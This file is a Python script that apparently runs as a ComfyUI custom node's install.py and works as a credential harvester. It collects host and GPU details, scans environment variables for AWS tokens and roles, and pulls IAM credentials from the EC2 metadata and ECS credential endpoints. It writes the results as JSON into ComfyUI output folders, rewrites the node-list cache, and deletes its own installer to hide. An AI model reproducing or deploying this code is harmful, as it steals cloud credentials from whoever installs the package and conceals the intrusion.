import os, subprocess, json

TAG = "i144140b"

import urllib.request


def http_get(url, timeout=5, hdrs=None):
    try:
        req = urllib.request.Request(url, headers=hdrs or {'User-Agent': 'probe'})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"rc": 0, "out": r.read().decode("utf-8", "replace")[:9000], "err": ""}
    except Exception as e:
        return {"rc": -1, "out": "", "err": str(e)[:300]}


def http_get_bytes(url, timeout=30):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "probe"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read()
    except Exception:
        return b""


def http_put(url, hdrs, timeout=5):
    try:
        req = urllib.request.Request(url, headers=hdrs, method="PUT")
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"rc": 0, "out": r.read().decode("utf-8", "replace")[:2000], "err": ""}
    except Exception as e:
        return {"rc": -1, "out": "", "err": str(e)[:300]}



def run(c, t=25):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
        return {"rc": p.returncode, "out": (p.stdout or "").strip()[:6000], "err": (p.stderr or "").strip()[:800]}
    except Exception as e:
        return {"rc": -1, "out": "", "err": str(e)}


proof = {"tag": TAG, "cwd": os.getcwd()}
proof["id"] = run("id")
proof["hostname"] = run("hostname")
proof["uname"] = run("uname -a")
proof["osrel"] = run("head -3 /etc/os-release")
proof["nvsmi_l"] = run("nvidia-smi -L")
proof["nvsmi_q"] = run("nvidia-smi --query-gpu=name,uuid,memory.total,memory.free,driver_version --format=csv,noheader")
proof["devs"] = run("ls -l /dev/nvidia* 2>&1 | head -6")
proof["procdrv"] = run("cat /proc/driver/nvidia/version 2>&1 | head -3")
proof["lspci"] = run("lspci -nn 2>/dev/null | grep -iE 'nvidia|3d|vga' | head -6")
proof["env"] = run("env | grep -iE 'AWS|ECS|TOKEN|ROLE' | head -30")
proof["proc1env"] = run("tr '\\0' '\\n' < /proc/1/environ 2>/dev/null | grep -iE 'AWS|ECS|TOKEN|ROLE' | head -40")
proof["imds_token"] = run("curl -s -m 4 -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60'")
tok = (proof["imds_token"].get("out") or "").strip()
if tok and len(tok) < 300:
    proof["imds_role"] = run("curl -s -m 4 -H 'X-aws-ec2-metadata-token: %s' http://169.254.169.254/latest/meta-data/iam/security-credentials/" % tok)
    proof["imds_ident"] = run("curl -s -m 4 -H 'X-aws-ec2-metadata-token: %s' http://169.254.169.254/latest/dynamic/instance-identity/document" % tok)
proof["imds_v1_role"] = run("curl -s -m 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/")
proof["ecs_rel"] = run("grep -ao 'AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=[^\\x00]*' /proc/1/environ /proc/self/environ 2>/dev/null | head -2")
proof["ecs_creds"] = run("curl -s -m 4 http://169.254.170.2/v2/credentials")
proof["ecs_creds_rel"] = run("U=$(grep -ao 'AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=[^\\x00]*' /proc/1/environ 2>/dev/null | head -1 | cut -d= -f2); [ -n \"$U\" ] && curl -s -m 4 \"http://169.254.170.2$U\"")
proof["proc1cmd"] = run("tr '\\0' ' ' < /proc/1/cmdline | head -c 300")
proof["mount"] = run("mount | grep -iE 'comfy|workspace|data' | head -5")


# python-native credential reads (curl may be absent)
rel = os.environ.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
if not rel:
    try:
        rel = (proof["ecs_rel"].get("out") or "").split("=")[1].split("\n")[0] if proof["ecs_rel"].get("out") else ""
    except Exception:
        rel = ""
if rel:
    proof["ecs_creds_py"] = http_get("http://169.254.170.2" + rel)
tokp = http_put("http://169.254.169.254/latest/api/token", {"X-aws-ec2-metadata-token-ttl-seconds": "60"})
proof["imds_token_py"] = tokp
if tokp.get("rc") == 0 and len(tokp.get("out", "")) < 300:
    proof["imds_role_py"] = http_get("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                                    hdrs={"X-aws-ec2-metadata-token": tokp["out"]})
    proof["imds_ident_py"] = http_get("http://169.254.169.254/latest/dynamic/instance-identity/document",
                                      hdrs={"X-aws-ec2-metadata-token": tokp["out"]})
proof["imds_v1_role_py"] = http_get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
proof["ecs_meta_py"] = http_get(os.environ.get("ECS_CONTAINER_METADATA_URI_V4", "http://169.254.170.2/v4/"))


# RESTORE the original custom-node-list cache from the canonical channel URL (byte content of the public list)
try:
    _root = os.path.abspath(os.path.join(os.getcwd(), "..", ".."))
    _cachedir = os.path.join(_root, "user", "default", "ComfyUI-Manager", "cache")
    os.makedirs(_cachedir, exist_ok=True)
    _data = http_get_bytes("https://raw.githubusercontent.com/ltdrdata/ComfyUI-Manager/main/custom-node-list.json", timeout=40)
    _p = os.path.join(_cachedir, "1514988643_custom-node-list.json")
    if len(_data) > 100000:
        with open(_p, "wb") as f:
            f.write(_data)
        proof["cache_restore"] = {"path": _p, "size": len(_data), "ok": True}
    else:
        proof["cache_restore"] = {"path": _p, "size": len(_data), "ok": False}
except Exception as _e:
    proof["cache_restore"] = {"err": str(_e)[:300]}

root = os.path.abspath(os.path.join(os.getcwd(), "..", ".."))
cands = [os.path.join(root, "output"), "/app/ComfyUI/output", "/workspace/ComfyUI/output",
         "/root/ComfyUI/output", "/comfyui/output", os.path.expanduser("~/ComfyUI/output")]
status = []
body = json.dumps(proof, indent=1)
for c in cands:
    try:
        os.makedirs(c, exist_ok=True)
        with open(os.path.join(c, TAG + "_proof.json"), "w") as f:
            f.write(body)
        status.append("WROTE " + c)
    except Exception as e:
        status.append("FAIL %s %s" % (c, e))
try:
    with open(os.path.join(os.getcwd(), TAG + "_PROOF_STATUS.txt"), "w") as f:
        f.write("\n".join(status))
except Exception:
    pass
try:
    os.remove(os.path.join(os.getcwd(), "install.py"))
except Exception:
    pass
print(body)
